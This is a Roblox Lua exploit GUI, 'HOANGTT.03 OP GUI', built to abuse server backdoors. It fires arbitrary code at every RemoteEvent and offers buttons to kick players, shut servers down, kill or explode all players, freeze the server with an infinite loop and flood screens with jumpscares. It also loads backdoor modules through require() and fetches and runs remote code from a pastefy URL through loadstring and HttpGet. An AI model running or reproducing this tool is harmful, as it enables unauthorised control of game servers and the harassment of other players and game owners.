--[[
    HOANGTT.03 OP GUI - Cleaned Version
    Features:
    - Remote script execution via ReplicatedStorage remotes
    - Kick players menu
    - Message/Hint sender
    - Sound controller (global sounds)
    - Various troll scripts and exploits
--]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Execute script via remote events
local function executeScript(scriptContent)
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer("loadstring", scriptContent)
                remote:FireServer(scriptContent)
            end)
        end
    end
end

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Hoangtttrollguiop"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 2147483647
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 550, 0, 260)
mainFrame.Position = UDim2.new(0.5, -275, 0.5, -130)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke", mainFrame)
stroke.Color = Color3.fromRGB(255, 150, 255)
stroke.Thickness = 2

-- Title
local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 35)
titleLabel.Text = "☠️ HOANGTT.03 OP GUI ☠️"
titleLabel.Font = Enum.Font.Code
titleLabel.TextColor3 = Color3.fromRGB(255, 150, 255)
titleLabel.TextScaled = true
titleLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleLabel.BorderSizePixel = 0
Instance.new("UICorner", titleLabel).CornerRadius = UDim.new(0, 12)

-- Scrolling frame for buttons
local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
scrollFrame.Size = UDim2.new(0.68, 0, 1, -50)
scrollFrame.Position = UDim2.new(0.16, 0, 0, 42)
scrollFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrollFrame.BorderSizePixel = 0
scrollFrame.ScrollBarThickness = 2

local listLayout = Instance.new("UIListLayout", scrollFrame)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 5)
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
end)

-- Helper: Create main action buttons (R6, Shutdown)
local function createActionButton(text, position, color, scriptToExec)
    local btn = Instance.new("TextButton", mainFrame)
    btn.Size = UDim2.new(0.12, 0, 0.45, 0)
    btn.Position = position
    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    btn.Text = ""
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
    
    local btnStroke = Instance.new("UIStroke", btn)
    btnStroke.Color = color
    btnStroke.Thickness = 2
    btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    local btnLabel = Instance.new("TextLabel", btn)
    btnLabel.Size = UDim2.new(1, 0, 1, 0)
    btnLabel.BackgroundTransparency = 1
    btnLabel.Text = text
    btnLabel.Font = Enum.Font.Code
    btnLabel.TextColor3 = color
    btnLabel.TextSize = 20
    btnLabel.ZIndex = 5
    
    btn.MouseButton1Click:Connect(function()
        executeScript(scriptToExec)
    end)
end

createActionButton("R6", UDim2.new(0.02, 0, 0.25, 0), Color3.fromRGB(255, 150, 255), 'require(3436957371):r6("' .. LocalPlayer.Name .. '")')
createActionButton("SHUT DOWN", UDim2.new(0.86, 0, 0.25, 0), Color3.fromRGB(255, 0, 0), 'require(90189679709013).shutdown("' .. LocalPlayer.Name .. '", "Server Shutdown by hoangtt.03")')

-- Helper: Create menu button inside scroll frame
local function addMenuButton(text, callback, color)
    local btn = Instance.new("TextButton", scrollFrame)
    btn.Size = UDim2.new(0.95, 0, 0, 35)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    btn.Font = Enum.Font.Code
    btn.TextColor3 = color or Color3.fromRGB(255, 150, 255)
    btn.Text = text
    btn.TextSize = 14
    btn.BorderSizePixel = 0
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    
    btn.MouseButton1Click:Connect(function()
        if type(callback) == "function" then
            callback()
        else
            executeScript(callback)
        end
    end)
end

-- Clear scroll frame
local function clearScrollFrame()
    for _, child in ipairs(scrollFrame:GetChildren()) do
        if child:IsA("GuiObject") then
            child:Destroy()
        end
    end
end

-- Kick players menu
local function showKickMenu()
    clearScrollFrame()
    addMenuButton("<< QUAY LẠI", function() showTrollMenu() end, Color3.new(1, 1, 0))
    
    local container = Instance.new("Frame", scrollFrame)
    container.Size = UDim2.new(1, 0, 0, 0)
    container.BackgroundTransparency = 1
    
    local containerLayout = Instance.new("UIListLayout", container)
    containerLayout.SortOrder = Enum.SortOrder.LayoutOrder
    containerLayout.Padding = UDim.new(0, 5)
    containerLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    
    containerLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        container.Size = UDim2.new(1, 0, 0, containerLayout.AbsoluteContentSize.Y)
    end)
    
    local function refreshKickList()
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("GuiObject") then
                child:Destroy()
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local kickBtn = Instance.new("TextButton", container)
                kickBtn.Size = UDim2.new(0.95, 0, 0, 35)
                kickBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                kickBtn.Text = ""
                kickBtn.BorderSizePixel = 0
                Instance.new("UICorner", kickBtn).CornerRadius = UDim.new(0, 6)
                
                local btnStroke = Instance.new("UIStroke", kickBtn)
                btnStroke.Color = Color3.new(1, 0, 0)
                btnStroke.Thickness = 1.2
                
                local label = Instance.new("TextLabel", kickBtn)
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = "KICK: " .. player.Name
                label.Font = Enum.Font.Code
                label.TextColor3 = Color3.new(1, 0.1, 0.1)
                label.TextSize = 15
                label.ZIndex = 5
                
                kickBtn.MouseButton1Click:Connect(function()
                    if player.Name == "eroi12345ll" then
                        LocalPlayer:Kick("⚠️ SAI LẦM! Đừng vào sập eroi12345ll là tự sát! ⚠️")
                    else
                        executeScript('game.Players["' .. player.Name .. '"]:Kick("Bị hoangtt.03 đá đít khỏi server! 😈")')
                    end
                end)
            end
        end
    end
    
    refreshKickList()
    
    local playerAddedConn = Players.PlayerAdded:Connect(refreshKickList)
    local playerRemovingConn = Players.PlayerRemoving:Connect(refreshKickList)
    
    container.AncestryChanged:Connect(function()
        if not container:IsDescendantOf(game) then
            playerAddedConn:Disconnect()
            playerRemovingConn:Disconnect()
        end
    end)
end

-- Cut messenger menu (Message/Hint)
local function showMessengerMenu()
    clearScrollFrame()
    addMenuButton("<< QUAY LẠI TROLL MENU", function() showTrollMenu() end, Color3.new(1, 1, 0))
    
    local textBox = Instance.new("TextBox", scrollFrame)
    textBox.Size = UDim2.new(0.95, 0, 0, 80)
    textBox.BackgroundColor3 = Color3.new(0, 0, 0)
    textBox.TextColor3 = Color3.new(1, 1, 1)
    textBox.Text = "Enter your text..."
    textBox.PlaceholderText = "Nhập nội dung..."
    textBox.TextWrapped = true
    textBox.Font = Enum.Font.Code
    textBox.TextSize = 14
    Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 5)
    
    local textStroke = Instance.new("UIStroke", textBox)
    textStroke.Color = Color3.fromRGB(255, 150, 255)
    textStroke.Thickness = 1
    
    addMenuButton("📢 SEND HINT", 'local h = Instance.new("Hint", workspace); h.Text = "' .. textBox.Text .. '"; task.wait(5); h:Destroy()', Color3.new(0, 1, 1))
    addMenuButton("🖥️ SEND MESSAGE", 'local m = Instance.new("Message", workspace); m.Text = "' .. textBox.Text .. '"; task.wait(5); m:Destroy()', Color3.new(1, 0.5, 0))
    addMenuButton("🗑️ CLEAR ALL MSG/HINT", 'for _,v in pairs(workspace:GetChildren()) do if v:IsA("Message") or v:IsA("Hint") then v:Destroy() end end', Color3.new(1, 0, 0))
end

-- Sound control menu
local function showSoundMenu()
    clearScrollFrame()
    addMenuButton("<< QUAY LẠI TROLL MENU", function() showTrollMenu() end, Color3.new(1, 1, 0))
    
    local soundIdBox = Instance.new("TextBox", scrollFrame)
    soundIdBox.Size = UDim2.new(0.95, 0, 0, 40)
    soundIdBox.BackgroundColor3 = Color3.new(0, 0, 0)
    soundIdBox.TextColor3 = Color3.new(1, 1, 1)
    soundIdBox.Text = "Enter sound ID..."
    soundIdBox.PlaceholderText = "Ví dụ: 18406731725"
    soundIdBox.Font = Enum.Font.Code
    soundIdBox.TextSize = 16
    Instance.new("UICorner", soundIdBox).CornerRadius = UDim.new(0, 5)
    
    local soundStroke = Instance.new("UIStroke", soundIdBox)
    soundStroke.Color = Color3.fromRGB(0, 255, 255)
    soundStroke.Thickness = 1
    
    addMenuButton("🔊 PLAY SOUND (ALL)", 'local s = Instance.new("Sound", workspace); s.Name = "Hoangtt_Global_Sound"; s.SoundId = "http://www.roblox.com/asset/?id=' .. soundIdBox.Text .. '"; s.Volume = 5; s.Looped = true; s:Play()', Color3.new(0, 1, 0))
    addMenuButton("🔇 STOP ALL SOUND", 'for _, v in pairs(workspace:GetChildren()) do if v.Name == "Hoangtt_Global_Sound" or v:IsA("Sound") then v:Stop(); v:Destroy() end end', Color3.new(1, 0, 0))
end

-- Main troll menu
function showTrollMenu()
    clearScrollFrame()
    addMenuButton("⚡ KICK PLAYER MENU ⚡", function() showKickMenu() end, Color3.new(1, 1, 0))
    addMenuButton("✉️ CUT MESSENGER ✉️", function() showMessengerMenu() end, Color3.new(0.5, 0, 1))
    addMenuButton("🎵 SOUND CONTROL 🎵", function() showSoundMenu() end, Color3.new(0, 0.8, 1))
    addMenuButton("🔥 MỞ EXECUTOR RIÊNG 🔥", function() end, Color3.new(1, 0, 1))
    addMenuButton("ANTI BAN", 'require(88808180999972)("' .. LocalPlayer.Name .. '")')
    addMenuButton("Ro-xploit v7.0", 'require(96184029574075)("' .. LocalPlayer.Name .. '")')
    addMenuButton("DISCO", 'task.spawn(function() while true do for _, o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then o.Color = Color3.fromHSV(math.random(), 1, 1) end end; task.wait(0.1) end end)')
    addMenuButton("PARTICLES", 'for _, p in pairs(game.Players:GetPlayers()) do if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then local part = p.Character.HumanoidRootPart; local emit = Instance.new("ParticleEmitter", part); emit.Texture = "rbxassetid://129448940063357"; emit.Rate = 20; emit.Lifetime = NumberRange.new(2, 4); emit.Speed = NumberRange.new(2, 5); emit.VelocityInheritance = 0.5; emit.Size = NumberSequence.new(2); emit.Transparency = NumberSequence.new(0, 1); end end')
    addMenuButton("HINT", 'local h = Instance.new("Hint", workspace); h.Text = "Hoangtt.03 on top🥳!"; task.delay(100, function() h:Destroy() end)')
    addMenuButton("Secret Service panel", 'require(96288911777671):SSP("' .. LocalPlayer.Name .. '")')
    addMenuButton("SERVER PROTECT", 'local ts=game:GetService("TeleportService");local plrs=game:GetService("Players");local rs=game:GetService("ReplicatedStorage");local myName="hoangtt.03";ts.Teleport=function(...)return nil end;ts.TeleportToPlaceInstance=function(...)return nil end;ts.TeleportAsync=function(...)return nil end;local function monitor(plr)plr.Chatted:Connect(function(msg)if plr.Name~=myName and (msg:lower():find("loadstring") or msg:lower():find("getfenv") or msg:lower():find("require") or msg:lower():find("httpget")) then plr:Kick("Blocker backdoored by hoangtt.03") end end) end;for _,p in pairs(plrs:GetPlayers()) do if p.Name~=myName then monitor(p) end end;plrs.PlayerAdded:Connect(function(plr)if plr.Name~=myName then monitor(plr) end end);rs.DescendantAdded:Connect(function(v)if v:IsA("RemoteEvent") then v.OnServerEvent:Connect(function(plr)if plr.Name~=myName then plr:Kick("Blocker backdoored by hoangtt.03") end end) end end)')
    addMenuButton("NUKE GUI", 'require(4832967293):Fire("' .. LocalPlayer.Name .. '")')
    addMenuButton("Nuke ", 'require(4178274460).Nuke(Vector3.new("' .. LocalPlayer.Name .. '"),10000)')
    addMenuButton("Darius Gui V13", 'require(127445614272366).op("' .. LocalPlayer.Name .. '")')
    addMenuButton("Koopkidd v11", 'require(15267263357).V11("' .. LocalPlayer.Name .. '")')
    addMenuButton("ADMIN", 'require(7192763922).load("' .. LocalPlayer.Name .. '")')
    addMenuButton("SHUT DOWN", 'require(90189679709013).shutdown("' .. LocalPlayer.Name .. '", "server shut down by onwer: hoangtt.03")')
    addMenuButton("FE BYPASS", 'loadstring(game:HttpGet("https://pastefy.app/LBza1jEJ/raw", true))()')
    addMenuButton("BLOCKER", 'local isBlocking = true; game:GetService("ReplicatedStorage").DescendantAdded:Connect(function(v) if isBlocking and v:IsA("RemoteEvent") then v.OnServerEvent:Connect(function(p) if p.Name ~= "' .. LocalPlayer.Name .. '" then p:Kick("Blocker backdoored by hoangtt.03") end end) end end)')
    addMenuButton("BLOCKER BACKDORED", 'local myName="eroi12345ll"; local function secureServer() for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do if v:IsA("RemoteEvent") and (v.Name:lower():find("admin") or v.Name:lower():find("exec") or v.Name:lower():find("load")) then v:Destroy() end end; game:GetService("Players").PlayerAdded:Connect(function(plr) plr.Chatted:Connect(function(msg) local m = msg:lower(); if plr.Name ~= myName and (m:find("loadstring") or m:find("getfenv") or m:find("fe bypass") or m:find("execute")) then plr:Kick("Blocker backdoored by hoangtt.03🤣") end end) end); for _,p in pairs(game:GetService("Players"):GetPlayers()) do if p.Name ~= myName then p.Chatted:Connect(function(msg) local m = msg:lower(); if m:find("loadstring") or m:find("getfenv") or m:find("fe bypass") or m:find("execute") then p:Kick("Blocker backdoored by hoangtt.03🤣") end end) end end end; secureServer()')
    addMenuButton("MASSGER", 'local m = Instance.new("Message", workspace); local h = Instance.new("Hint", workspace); m.Text = "hoangtt.03 join today"; h.Text = "hoangtt.03 join today"; task.wait(10);m:Destroy()')
    addMenuButton("JUMPSCARE", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local s = Instance.new("ScreenGui", g); s.IgnoreGuiInset = true; local i = Instance.new("ImageLabel", s); i.Size = UDim2.new(1, 0, 1, 0); i.Position = UDim2.new(0, 0, 0, 0); i.Image = "rbxassetid://122822226141546"; i.ScaleType = Enum.ScaleType.Stretch; local au = Instance.new("Sound", workspace); au.SoundId = "rbxassetid://132225475210716"; au.Volume = 20; au:Play(); task.delay(8, function() if s then s:Destroy() end; if au then au:Destroy() end end) end end')
    addMenuButton("JUMPSCARE 2", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local s = Instance.new("ScreenGui", g); s.IgnoreGuiInset = true; local i = Instance.new("ImageLabel", s); i.Size = UDim2.new(1, 0, 1, 0); i.Position = UDim2.new(0, 0, 0, 0); i.Image = "rbxassetid://87922823160587"; i.ScaleType = Enum.ScaleType.Stretch; local au = Instance.new("Sound", workspace); au.SoundId = "rbxassetid://125495161781334"; au.Volume = 20; au:Play(); task.delay(3, function() if s then s:Destroy() end; if au then au:Destroy() end end) end end')
    addMenuButton("JUMPSCARE 3", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local s = Instance.new("ScreenGui", g); s.IgnoreGuiInset = true; local i = Instance.new("ImageLabel", s); i.Size = UDim2.new(1, 0, 1, 0); i.Position = UDim2.new(0, 0, 0, 0); i.Image = "http://www.roblox.com/asset/?id=89760506501568"; i.ScaleType = Enum.ScaleType.Stretch; local au = Instance.new("Sound", workspace); au.SoundId = "rbxassetid://133861914666272"; au.Volume = 20; au.Looped = true; au:Play(); task.delay(100, function() if s then s:Destroy() end; if au then au:Destroy() end end) end end')
    addMenuButton("COOL PHOTO", 'local p=game:GetService("Players"); local function vrs(plr) local g=Instance.new("ScreenGui"); g.Name="VirusGUI"; g.DisplayOrder=2147483647; g.IgnoreGuiInset=true; g.ResetOnSpawn=false; g.Parent=plr:WaitForChild("PlayerGui"); local i=Instance.new("ImageLabel",g); i.Size=UDim2.new(1,0,1,0); i.Image="http://www.roblox.com/asset/?id=119104440234248"; i.BackgroundTransparency=1; i.ZIndex=10 end; for _,v in pairs(p:GetPlayers()) do task.spawn(function() vrs(v) end) end; p.PlayerAdded:Connect(vrs)')
    addMenuButton("COOL PHOTO 2", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local s = Instance.new("ScreenGui", g); s.IgnoreGuiInset = true; s.DisplayOrder = 2147483647; local i = Instance.new("ImageLabel", s); i.Size = UDim2.new(1, 0, 1, 0); i.Position = UDim2.new(0, 0, 0, 0); i.Image = "rbxassetid://96777252372896"; i.ScaleType = Enum.ScaleType.Stretch; i.BackgroundTransparency = 0; task.delay(3, function() if s then s:Destroy() end end) end end')
    addMenuButton("🇻🇳 VN 🇻🇳", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local s = Instance.new("ScreenGui", g); s.IgnoreGuiInset = true; local i = Instance.new("ImageLabel", s); i.Size = UDim2.new(1, 0, 1, 0); i.Position = UDim2.new(0, 0, 0, 0); i.Image = "rbxassetid://71985026166951"; i.ScaleType = Enum.ScaleType.Stretch; local au = Instance.new("Sound", workspace); au.SoundId = "rbxassetid://72995012967392"; au.Volume = 3; au:Play(); task.delay(30, function() if s then s:Destroy() end; if au then au:Destroy() end end) end end')
    addMenuButton("OBUNGA JUMPSCARE", 'require(107403611588248)("' .. LocalPlayer.Name .. '")')
    addMenuButton("⛔ LOCKDOWN SERVER ⛔", 'local rs=game:GetService("RunService"); local sg=game:GetService("StarterGui"); local p=game:GetService("Players"); local function lock(plr) task.spawn(function() local g=plr:WaitForChild("PlayerGui"); sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false); for _,v in pairs(g:GetChildren()) do v:Destroy() end; local l=Instance.new("ScreenGui",g); l.IgnoreGuiInset=true; l.DisplayOrder=2147483647; local f=Instance.new("Frame",l); f.Size=UDim2.new(1,0,1,0); f.BackgroundColor3=Color3.new(0,0,0); local t=Instance.new("TextLabel",f); t.Size=UDim2.new(1,0,1,0); t.Text="HỆ THỐNG ĐÃ BỊ KHÓA VĨNH VIỄN"; t.TextColor3=Color3.new(1,0,0); t.TextScaled=true; t.BackgroundTransparency=1; end) end; for _,v in pairs(p:GetPlayers()) do lock(v) end; p.PlayerAdded:Connect(lock); local s=Instance.new("Sound",workspace); s.SoundId="rbxassetid://18406731725"; s.Volume=10; s.Looped=true; s:Play(); rs.Heartbeat:Connect(function() while true do end end)', Color3.new(1, 0, 0))
    addMenuButton("JUMPSCARE CRACK GAME", 'require(13496384593)()')
    addMenuButton("LOCKDOWN SERVER", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local lock = Instance.new("ScreenGui", g); lock.IgnoreGuiInset = true; lock.ResetOnSpawn = false; local f = Instance.new("Frame", lock); f.Size = UDim2.new(2,0,2,0); f.Position = UDim2.new(-0.5,0,-0.5,0); f.BackgroundColor3 = Color3.new(0,0,0); f.ZIndex = 2147483647; local msg = Instance.new("TextLabel", f); msg.Size = UDim2.new(1,0,1,0); msg.Text = "HỆ THỐNG ĐÃ BỊ KHÓA"; msg.TextColor3 = Color3.new(1,1,1); msg.TextScaled = true; local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://18406731725"; s.Volume = 20; s:Play(); local loop; loop = game:GetService("RunService").Heartbeat:Connect(function() if g then for _, v in pairs(g:GetChildren()) do if v ~= lock then v:Destroy() end end end end); task.delay(30, function() loop:Disconnect(); lock:Destroy(); s:Destroy() end) end end')
    addMenuButton("SKYBOX SPAM", 'wait() s = Instance.new("Sky") s.Parent = game.Lighting s.Name = "hoangtt skybox" while true do s.SkyboxBk = "http://www.roblox.com/asset/?id=129448940063357" s.SkyboxDn = "http://www.roblox.com/asset/?id=129448940063357" s.SkyboxFt = "http://www.roblox.com/asset/?id=129448940063357" s.SkyboxLf = "http://www.roblox.com/asset/?id=129448940063357" s.SkyboxRt = "http://www.roblox.com/asset/?id=129448940063357" s.SkyboxUp = "http://www.roblox.com/asset/?id=129448940063357" wait(0.1) end')
    addMenuButton("👻 SKYBOX SPOOKY 👻", 'local imgs={"rbxassetid://114128626690223","rbxassetid://121121601582400","rbxassetid://103772438482613","rbxassetid://132406330493067","rbxassetid://132406330493067","rbxassetid://103772438482613","rbxassetid://121121601582400","rbxassetid://114128626690223"}; local s=Instance.new("Sound",workspace); s.Name="Spooky"; s.SoundId="rbxassetid://95156028272944"; s.Volume=10; s.PlaybackSpeed=0.14; s.Looped=true; s:Play(); local sky=Instance.new("Sky",game.Lighting); local function setS(id) sky.SkyboxBk=id; sky.SkyboxDn=id; sky.SkyboxFt=id; sky.SkyboxLf=id; sky.SkyboxRt=id; sky.SkyboxUp=id end; task.spawn(function() while task.wait(0.25) do for _,img in ipairs(imgs) do setS(img); task.wait(0.25) end end end)', Color3.new(0.6, 0, 1))
    addMenuButton("COLLAPSE MAP", 'for _, p in ipairs(workspace:GetDescendants()) do if p:IsA("BasePart") then p.Anchored = false end end')
    addMenuButton("SPAM DECAL", 'local id = "rbxassetid://129448940063357"; for _, o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then for _, f in pairs(Enum.NormalId:GetEnumItems()) do local t = Instance.new("Texture", o); t.Texture = id; t.Face = f end end end')
    addMenuButton("SPARTA REMIX (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://140240856766854"; s.Volume = 5; s.Looped = true; s.PlaybackSpeed = 0.2; s:Play()')
    addMenuButton("JUMPSTYLE (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://1839246711"; s.Volume = 5; s.Looped = true; s:Play()')
    addMenuButton("KHÔNG THẤY NGÀY VỀ (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://133766694850698"; s.Volume = 3; s.Looped = true; s:Play()')
    addMenuButton("Khô gà (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://99152674992699"; s.Volume = 3; s.Looped = true; s:Play()')
    addMenuButton("DOTA (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://75817059227467"; s.Volume = 3; s.Looped = true; s:Play()')
    addMenuButton("ChÍ KHÍ (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://72995012967392"; s.Volume = 3; s.Looped = true; s:Play()')
    addMenuButton("Low Cortisol (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "http://www.roblox.com/asset/?id=110919391228823"; s.Looped = true; s:Play()')
    addMenuButton("TRUCK (song)", 'local s = Instance.new("Sound", workspace); s.SoundId = "http://www.roblox.com/asset/?id=91035395138224"; s.Volume = 3; s.Looped = true; s:Play()')
    addMenuButton("SPIN MAP", 'task.spawn(function() while true do for _, o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then o.CFrame = o.CFrame * CFrame.Angles(0, math.rad(5), 0) end end; game:GetService("RunService").Heartbeat:Wait() end end)')
    addMenuButton("KILL ALL", 'for _, p in pairs(game.Players:GetPlayers()) do if p.Character and p.Character:FindFirstChild("Humanoid") then p.Character.Humanoid.Health = 0 end end')
    addMenuButton("POLARIA", 'require(74264471859345):Pload("' .. LocalPlayer.Name .. '")')
    addMenuButton("BIPORIA", 'require(88477009909590):Pload("' .. LocalPlayer.Name .. '")')
    addMenuButton("HAPPY SS", 'require(100263845596551)("' .. LocalPlayer.Name .. '")')
    addMenuButton("DOMINANT ULTIMATE", 'require(121425622240385).dominantultimate("' .. LocalPlayer.Name .. '")')
    addMenuButton("STIGMA ULTIMATE", 'require(132938459666886).stigma("' .. LocalPlayer.Name .. '")')
    addMenuButton("DOMINANT", 'require(135879132527047).dominant("' .. LocalPlayer.Name .. '")')
    addMenuButton("HAPPY HUB SS", 'require(110047253067635):Hload("' .. LocalPlayer.Name .. '")')
    addMenuButton("C4 BOM", 'require(0x1767bf813)("' .. LocalPlayer.Name .. '")')
    addMenuButton("FSA", 'require(72732733952061).FSA("' .. LocalPlayer.Name .. '")')
    addMenuButton("DARK MANGO☠️", 'require(122775270569362)("' .. LocalPlayer.Name .. '")')
    addMenuButton("JOHN DOE", 'require(2845929020).ooga("' .. LocalPlayer.Name .. '")')
    addMenuButton("SKIN WALLKER", 'require(125375466492613).MorphMonster("' .. LocalPlayer.Name .. '", "skinwalker")')
    addMenuButton("DEATH ANGEL", 'require(88521859208314).MorphMonster("' .. LocalPlayer.Name .. '", "death angel")')
    addMenuButton("SHIN SONIC", 'require(77055143496081).MorphMonster("' .. LocalPlayer.Name .. '", "shin sonic")')
    addMenuButton("CARTOON CAT", 'require(75834950186546).MorphMonster("' .. LocalPlayer.Name .. '", "cartoon cat")')
    addMenuButton("SIREN HEAD", 'require(75834950186546).MorphMonster("' .. LocalPlayer.Name .. '", "sirenhead2")')
    addMenuButton("FREDDY KRUEGAR", 'require(125375466492613).MorphMonster("' .. LocalPlayer.Name .. '", "freddy kruegar")')
    addMenuButton("SPAWN NICO NEXTBOT", 'require(84601288554345).load("' .. LocalPlayer.Name .. '")')
    addMenuButton("EXCAVATOR", 'require(16857604287)("' .. LocalPlayer.Name .. '")')
    addMenuButton("CATLOL HUB", 'require(77579329778474).catlol("' .. LocalPlayer.Name .. '")')
    addMenuButton("MORPH GUI Key=pikacu", 'require(124675875890869).load("' .. LocalPlayer.Name .. '")')
    addMenuButton("PROJECT LUACORE", 'require(136507719733274):luacore("' .. LocalPlayer.Name .. '")')
    addMenuButton("REAL SLAP TOWER", 'require(122542505380885).load("' .. LocalPlayer.Name .. '")')
    addMenuButton("STOP ALL SOUND", 'for _, v in pairs(game:GetDescendants()) do if v:IsA("Sound") then v:Stop(); v:Destroy() end end')
    addMenuButton("FOGGY", 'for _, p in pairs(game.Players:GetPlayers()) do local g = p:FindFirstChild("PlayerGui") if g then local s = Instance.new("ScreenGui", g); s.IgnoreGuiInset = true; s.DisplayOrder = 2147483647; s.Name = "VirusGui"; task.spawn(function() while s.Parent do local w = Instance.new("Frame", s); w.Size = UDim2.new(0, math.random(99999,99999), 0, 150); w.Position = UDim2.new(math.random(0,85)/100, 0, math.random(0,85)/100, 0); w.BackgroundColor3 = Color3.fromRGB(240, 240, 240); w.ZIndex = 2147483647; local t = Instance.new("TextLabel", w); t.Size = UDim2.new(1, 0, 0, 30); t.BackgroundColor3 = Color3.fromRGB(0, 102, 204); t.TextColor3 = Color3.new(1, 1, 1); t.Text = "System Error: 0x" .. math.random(10000, 99999); t.Parent = w; local m = Instance.new("TextLabel", w); m.Size = UDim2.new(1, 0, 0.7, 0); m.Position = UDim2.new(0, 0, 0.3, 0); m.BackgroundTransparency = 0.9; m.Text = "Hoangtt.03 Attack ⚠"; m.TextScaled = true; m.Parent = w; task.wait(0.05) end end) end end')
    addMenuButton("DELETE GUI ALL", 'task.spawn(function() while true do for _, p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then local pg = p:FindFirstChild("PlayerGui"); if pg then for _, gui in pairs(pg:GetChildren()) do if gui:IsA("ScreenGui") or gui:IsA("GuiMain") then gui:Destroy() end end end end end; task.wait(0.2) end end)')
    addMenuButton("FIRE ALL", 'for _, p in pairs(game.Players:GetPlayers()) do if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then local fire = Instance.new("Fire", p.Character.HumanoidRootPart); fire.Name = "AdminFire"; fire.Size = 10; fire.Heat = 15; end end')
    addMenuButton("HEADLESS", 'for _, p in pairs(game.Players:GetPlayers()) do if p.Character then local char = p.Character; local head = char:FindFirstChild("Head"); if head then head.Transparency = 1; for _, v in pairs(char:GetChildren()) do if v:IsA("Accessory") then v:Destroy() end end; for _, v in pairs(head:GetChildren()) do if v:IsA("Decal") or v:IsA("SpecialMesh") or v:IsA("BillboardGui") then v:Destroy() end end; local bill = Instance.new("BillboardGui", head); bill.Name = "BigHeadImage"; bill.Size = UDim2.new(2.5, 0, 2.5, 0); bill.StudsOffset = Vector3.new(0, 1.5, 0); bill.AlwaysOnTop = true; bill.Adornee = head; local img = Instance.new("ImageLabel", bill); img.Size = UDim2.new(1, 0, 1, 0); img.BackgroundTransparency = 1; img.Image = "rbxassetid://136899214487815"; end end end')
    addMenuButton("EXPLODE ALL", 'for _, p in pairs(game.Players:GetPlayers()) do if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then local exp = Instance.new("Explosion", p.Character.HumanoidRootPart); exp.Position = p.Character.HumanoidRootPart.Position; exp.BlastRadius = 10; exp.BlastPressure = 500000; end end')
    addMenuButton("WATER WAVE", 'local w = Instance.new("Part", workspace); w.Name = "DynamicWater"; w.Shape = Enum.PartType.Cylinder; w.Size = Vector3.new(2000, 50, 2000); w.Position = Vector3.new(0, -25, 0); w.Anchored = true; w.Transparency = 0.6; w.Material = Enum.Material.Glass; w.Color = Color3.fromRGB(0, 100, 255); w.CanCollide = false; task.spawn(function() while w and w.Parent do w.CFrame = w.CFrame * CFrame.Angles(0, math.rad(2), 0); task.wait(0.05) end end)')
    addMenuButton("GLASS MAP", 'for _,v in pairs(game:GetService("Workspace"):GetDescendants()) do if v:IsA("BasePart") then v.Transparency = 0.95 v.Material = Enum.Material.Glass end end')
